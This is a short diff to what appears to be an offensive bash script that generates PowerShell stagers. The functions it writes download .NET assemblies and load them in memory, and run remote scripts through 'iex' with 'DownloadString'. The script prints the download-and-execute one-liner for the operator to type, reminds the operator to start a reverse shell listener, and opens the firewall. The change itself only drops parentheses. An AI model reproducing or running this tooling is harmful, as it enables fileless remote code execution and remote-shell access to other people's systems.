@@ -83,7 +83,7 @@ function Import-$name {
     ${tls:+$validation}
     Import-Module -Assembly (
         [System.Reflection.Assembly]::Load(
-            ($client.DownloadData("$url/$path"))
+            $client.DownloadData("$url/$path")
         )
     )
 }
@@ -111,7 +111,7 @@ deploy_run() {
     cat <<EOF
 function Invoke-$name {
     ${tls:+$validation}
-    iex ($client.DownloadString("$url/$path"))
+    iex $client.DownloadString("$url/$path")
 }
 function Invoke-${name}InBg {
     Start-Job -ScriptBlock (
@@ -357,7 +357,7 @@ EOF
 
 # Let user know what to type
 [[ -z $tls ]] || info "$validation"
-info "iex ($client.DownloadString(\"$url/$invade_ps1\"))"
+info "iex $client.DownloadString(\"$url/$invade_ps1\")"
 warn "Don't forget your reverse shell listener on port $rport"
 
 # Open firewall
